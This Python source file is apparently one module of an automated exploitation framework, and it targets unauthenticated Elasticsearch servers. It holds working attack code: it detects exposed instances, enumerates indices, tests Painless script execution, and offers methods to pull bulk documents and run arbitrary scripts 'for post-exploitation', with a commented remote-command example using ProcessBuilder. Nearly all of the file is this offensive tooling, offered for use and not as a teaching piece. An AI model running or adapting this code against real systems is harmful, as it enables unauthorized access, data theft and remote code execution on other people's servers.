"""
Elasticsearch Exploit Module
Targets Elasticsearch instances without authentication
"""

import socket
import requests
import json
from typing import Dict, Tuple, List
import sys
import os

sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from exploits.exploit_manager import BaseExploit
from utils.logger import logger


class Elasticsearch_Exploit(BaseExploit):
    """
    Elasticsearch Unauthorized Access Exploit
    Targets: Elasticsearch instances (ports 9200, 9300)
    
    Attack Vectors:
    1. Unauthenticated API access
    2. Script execution via Painless/Groovy
    3. Index enumeration and data extraction
    4. Cluster information disclosure
    """
    
    def __init__(self):
        super().__init__(
            name="Elasticsearch_Exploit",
            target_ports=[9200, 9300],
            target_os=["Windows", "Linux", "Unix"]
        )
    
    def check_vulnerable(self, target: Dict) -> bool:
        """Check if Elasticsearch is accessible"""
        ip = target['ip']
        
        # Check Elasticsearch ports
        es_ports = [9200, 9300]
        for port in es_ports:
            if port in target.get('open_ports', []):
                try:
                    # Try to access Elasticsearch API
                    url = f"http://{ip}:{port}"
                    response = requests.get(url, timeout=5)
                    
                    if response.status_code == 200:
                        data = response.json()
                        
                        # Check for Elasticsearch indicators
                        if 'cluster_name' in data or 'version' in data:
                            logger.debug(f"Elasticsearch detected on {ip}:{port}")
                            return True
                            
                except Exception as e:
                    logger.debug(f"Elasticsearch check failed on {ip}:{port}: {e}")
        
        return False
    
    def exploit(self, target: Dict) -> Tuple[bool, Dict]:
        """Attempt Elasticsearch exploitation"""
        ip = target['ip']
        
        # Find which port is open
        port = 9200
        for p in [9200, 9300]:
            if p in target.get('open_ports', []):
                port = p
                break
        
        logger.info(f"Attempting Elasticsearch exploit on {ip}:{port}")
        
        try:
            base_url = f"http://{ip}:{port}"
            
            # Get cluster info
            cluster_info = self._get_cluster_info(base_url)
            
            if cluster_info:
                # Try to enumerate indices
                indices = self._enumerate_indices(base_url)
                
                # Check if we can execute scripts
                can_execute_scripts = self._check_script_execution(base_url)
                
                self.stats['success'] += 1
                logger.success(f"Elasticsearch unauthorized access on {ip}:{port}")
                
                return True, {
                    'method': 'Elasticsearch_Unauthorized',
                    'credentials': 'none (unauthenticated)',
                    'port': port,
                    'service': 'Elasticsearch',
                    'cluster_name': cluster_info.get('cluster_name', 'unknown'),
                    'version': cluster_info.get('version', {}).get('number', 'unknown'),
                    'indices_count': len(indices),
                    'script_execution': can_execute_scripts
                }
            
            self.stats['failure'] += 1
            return False, {}
            
        except Exception as e:
            self.stats['failure'] += 1
            logger.error(f"Elasticsearch exploit error on {ip}: {e}")
            return False, {}
    
    def _get_cluster_info(self, base_url: str) -> Dict:
        """Get Elasticsearch cluster information"""
        try:
            response = requests.get(base_url, timeout=5)
            
            if response.status_code == 200:
                return response.json()
            
            return {}
            
        except:
            return {}
    
    def _enumerate_indices(self, base_url: str) -> List[str]:
        """Enumerate all indices"""
        try:
            url = f"{base_url}/_cat/indices?format=json"
            response = requests.get(url, timeout=5)
            
            if response.status_code == 200:
                indices_data = response.json()
                indices = [idx.get('index', '') for idx in indices_data]
                logger.info(f"Found {len(indices)} indices")
                return indices
            
            return []
            
        except:
            return []
    
    def _check_script_execution(self, base_url: str) -> bool:
        """Check if we can execute scripts"""
        try:
            # Try to execute a simple Painless script
            url = f"{base_url}/_search"
            
            query = {
                "query": {
                    "match_all": {}
                },
                "script_fields": {
                    "test": {
                        "script": {
                            "lang": "painless",
                            "source": "1+1"
                        }
                    }
                },
                "size": 1
            }
            
            response = requests.post(url, json=query, timeout=5)
            
            # If script executed without error, we have script execution
            if response.status_code == 200:
                logger.info("Painless script execution available")
                return True
            
            return False
            
        except:
            return False
    
    def extract_data(self, base_url: str, index: str, size: int = 100) -> List[Dict]:
        """
        Extract data from specific index (for post-exploitation)
        """
        try:
            url = f"{base_url}/{index}/_search"
            
            query = {
                "query": {
                    "match_all": {}
                },
                "size": size
            }
            
            response = requests.post(url, json=query, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                hits = data.get('hits', {}).get('hits', [])
                return [hit.get('_source', {}) for hit in hits]
            
            return []
            
        except Exception as e:
            logger.error(f"Data extraction error: {e}")
            return []
    
    def execute_painless_script(self, base_url: str, script: str) -> str:
        """
        Execute Painless script (for post-exploitation)
        
        Example for RCE (if enabled):
        ProcessBuilder pb = new ProcessBuilder("whoami");
        pb.start();
        """
        try:
            url = f"{base_url}/_search"
            
            query = {
                "query": {
                    "match_all": {}
                },
                "script_fields": {
                    "result": {
                        "script": {
                            "lang": "painless",
                            "source": script
                        }
                    }
                },
                "size": 1
            }
            
            response = requests.post(url, json=query, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                hits = data.get('hits', {}).get('hits', [])
                if hits:
                    return str(hits[0].get('fields', {}).get('result', ['No result'])[0])
            
            return f"Error: {response.status_code}"
            
        except Exception as e:
            return f"Exception: {str(e)}"


if __name__ == "__main__":
    # Test the exploit
    es = Elasticsearch_Exploit()
    
    test_target = {
        'ip': '192.168.1.100',
        'open_ports': [9200],
        'os_guess': 'Linux'
    }
    
    print(f"Testing Elasticsearch exploit on {test_target['ip']}")
    
    if es.check_vulnerable(test_target):
        print("Target appears vulnerable")
        success, result = es.exploit(test_target)
        
        if success:
            print(f"Exploit successful: {result}")
        else:
            print("Exploit failed")
    else:
        print("Target not vulnerable")
